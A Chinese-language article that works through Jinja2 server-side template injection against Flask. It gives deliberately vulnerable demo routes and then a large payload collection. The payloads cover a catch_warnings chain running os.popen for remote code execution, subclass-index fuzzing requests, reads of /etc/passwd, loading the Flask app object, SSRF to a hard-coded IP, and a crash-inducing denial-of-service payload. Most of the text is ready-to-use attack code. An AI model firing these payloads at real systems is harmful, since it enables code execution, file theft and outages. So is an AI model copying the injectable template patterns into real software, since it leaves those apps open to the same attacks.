# 深入探究 Jinja2 SSTI Payload 构造

本文旨在深入探讨Jinja2 SSTI（Server-Side Template Injection）payload的构造方法，总结相关payload的构造规律，探究其细节，并扩展Jinja2 SSTI的攻击面。

## 官方文档参考
- Python 内置函数
- Jinja2 全局变量
- Jinja2 语法

## 使用模板渲染的代码示例

### 使用 `render_template_string`
```python
from flask import Flask, request
from flask import render_template_string

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World!'

@app.route("/fuck", methods=['GET', 'POST'])
def fuck():
    id = request.args["id"]
    t = f"Hello {id} !!!"
    return render_template_string(t)

if __name__ == '__main__':
    app.run("0.0.0.0")
```

### 使用 `render_template`
`templates/fuck.html`:
```html
Hello {{ id }} !!!
```

```python
from flask import Flask, request
from flask import render_template

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World!'

@app.route("/fuck", methods=['GET', 'POST'])
def fuck():
    id = request.args["id"]
    return render_template("fuck.html", id=id)

if __name__ == '__main__':
    app.run("0.0.0.0")
```

### 使用 `Template`
```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World!'

@app.route("/fuck", methods=['GET', 'POST'])
def fuck():
    id = request.args["id"]
    t = Template(f"Hello {id} !!!")
    return t.render()

if __name__ == '__main__':
    app.run("0.0.0.0")
```

> 注意：使用 `Template` 时无法访问全局对象，只能访问全局函数和全局类。

## 构造 Payload

### 通过特定类获取 gadget
可以通过 `[].__class__.__base__.__subclasses__()` 获取所有类，然后通过 `.__init__.__globals__` 访问 `os`、`sys` 等模块，实现远程代码执行（RCE）。

#### 常用 Payload
利用 `catch_warnings` 类进行 RCE：
```jinja
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

#### Fuzz 测试以获取更多可利用类
使用 Docker 进行 fuzz 测试，以避免本地环境中的额外库干扰。
```sh
docker pull jcdemo/flaskapp
```

测试请求：
```http
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§].__init__.__globals__["__builtins__"]}} HTTP/1.1
```

遍历下标从 0 到 456，确定类名：
```http
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§]}} HTTP/1.1
```

类似地，可以 fuzz 出哪些类可以访问 `os` 和 `sys`：
```http
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§].__init__.__globals__["os"]}} HTTP/1.1
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§]}} HTTP/1.1
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§].__init__.__globals__["sys"]}} HTTP/1.1
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§]}} HTTP/1.1
```

### 通过 Jinja2 全局变量获取 gadget
核心思路是通过全局变量访问 `__globals__`，并在其中寻找 gadget。

Jinja2 默认可用的全局变量包括：
- **config**: 当前配置对象
- **request**: 当前请求对象
- **session**: 当前会话对象
- **g**: 请求绑定的全局变量对象
- **url_for**: 生成 URL 的函数
- **get_flashed_messages**: 获取闪现消息的函数

全局函数和全局类：
- **range**
- **lipsum**
- **dict**
- **cycler**
- **joiner**
- **namespace**

使用 `Template` 时，只能访问全局函数和全局类，而不能访问全局对象。

#### 可用的 Payload
```jinja
{{lipsum["__globals__"]}} # __builtins__
{{cycler.__init__["__globals__"]}} # __builtins__
{{joiner.__init__["__globals__"]}} # __builtins__
{{namespace.__init__["__globals__"]}} # __builtins__
```

使用 `render_template` 或 `render_template_string` 时，可以使用的 Payload 包括：
```jinja
{{lipsum["__globals__"]}} # __builtins__
{{cycler.__init__["__globals__"]}} # __builtins__
{{joiner.__init__["__globals__"]}} # __builtins__
{{namespace.__init__["__globals__"]}} # __builtins__
{{config.__init__["__globals__"]}} # __builtins__ os
{{config.from_pyfile["__globals__"]}} # __builtins__ os
{{request.__init__["__globals__"]}} # __builtins__
{{request._get_file_stream["__globals__"]}} # __builtins__
{{request.close["__globals__"]}} # __builtins__
{{session.__init__["__globals__"]}} # __builtins__
{{g.get["__globals__"]}} # __builtins__ sys
{{g.pop["__globals__"]}} # __builtins__ sys
{{url_for["__globals__"]}} # __builtins__ os sys
{{get_flashed_messages["__globals__"]}} # __builtins__ os sys
```

### 通过 `Undefined` 获取 gadget
在 Jinja2 环境中，未定义的对象会被返回为 `Undefined` 对象。可以利用这一点获取 gadget：
```jinja
{{fuck.__init__.__globals__}} # __builtins__ sys
{{fuck.__init__["__globals__"]}} # __builtins__ sys
```

### 通过 `self` 获取 gadget
```jinja
{{self.__init__["__globals__"]}} # __builtins__ sys
```

### 通过特定类实现 DOS、读文件、导入包等效果
Fuzz 测试以找到能处理一个参数的类名：
```http
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§]("/etc/passwd")}} HTTP/1.1
GET /fuck?id={{[].__class__.__base__.__subclasses__()[§1§]}} HTTP/1.1
```

#### 可以读文件的类
- **LazyFile**:
  ```jinja
  409 click.utils.LazyFile
  from click.utils import LazyFile
  LazyFile("/etc/passwd").read()
  {{[].__class__.__base__.__subclasses__()[409]("/etc/passwd").read()}}
  ```
- **_PackageBoundObject**:
  ```jinja
  428 flask.helpers._PackageBoundObject
  {{[].__class__.__base__.__subclasses__()[428]("fuck","bitch","/").open_resource("/etc/passwd").read()}}
  {{[].__class__.__base__.__subclasses__()[428]("fuck","/").open_resource("/etc/passwd").read()}}
  ```
- **FileLoader**:
  ```jinja
  91 _frozen_importlib_external.FileLoader
  {{[].__class__.__base__.__subclasses__()[91].get_data(0,"/etc/passwd")}}
  ```

#### 获取当前 Flask 应用对象
- **ScriptInfo**:
  ```jinja
  430 flask.cli.ScriptInfo
  {{[].__class__.__base__.__subclasses__()[430]().load_app()}}
  ```

获取应用后，可以任意读取文件：
```jinja
{{[].__class__.__base__.__subclasses__()[430]().load_app().open_instance_resource("/etc/passwd").read()}}
```

可以多次运行消耗内存，占用端口：
```jinja
{{[].__class__.__base__.__subclasses__()[430]().load_app().run("0.0.0.0","8888")}}
```

#### 加载包
- **ImpImporter**:
  ```jinja
  288 pkgutil.ImpImporter
  from pkgutil import ImpImporter
  ImpImporter("/usr/lib/python3.8/").find_module("os").load_module("os")
  {{[].__class__.__base__.__subclasses__()[288]("/usr/local/lib/python3.7").find_module("os").load_module("os")}}
  ```
- **BuiltinImporter**:
  ```jinja
  80 _frozen_importlib.BuiltinImporter
  {{[].__class__.__base__.__subclasses__()[80].load_module("os")}}
  ```

#### 实现 SSRF
- **HTTPConnection**:
  ```jinja
  228 http.client.HTTPConnection
  import http
  c = http.client.HTTPConnection('87.94.119.19:12345')
  c.request("GET","/index.php")
  {{[].__class__.__base__.__subclasses__()[228]("87.94.119.19:12345").request("GET","/index.php")}}
  ```

#### 实现 DOS
- **SignalDictMixin**:
  ```jinja
  335 decimal.SignalDictMixin
  GET /fuck?id={{[].__class__.__base__.__subclasses__()[335]("fuck")}} HTTP/1.1
  {% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'SignalDictMixin' %}
      {{c("fuck")}}
  {% endif %}
  {% endfor %}
  ```

经过测试，在最新版本的 Flask 中也能成功崩溃。

#### 不能利用的类
- **module**:
  ```jinja
  {{[].__class__.__base__.__subclasses__()[56]("os")}}
  ```

#### 判断对象类型
- **type**:
  ```jinja
  {{[].__class__.__base__.__subclasses__()[0](config)}}
  {{[].__class__.__base__.__subclasses__()[0](request)}}
  ```

通过这些方法，可以更全面地理解和利用 Jinja2 SSTI 的攻击面。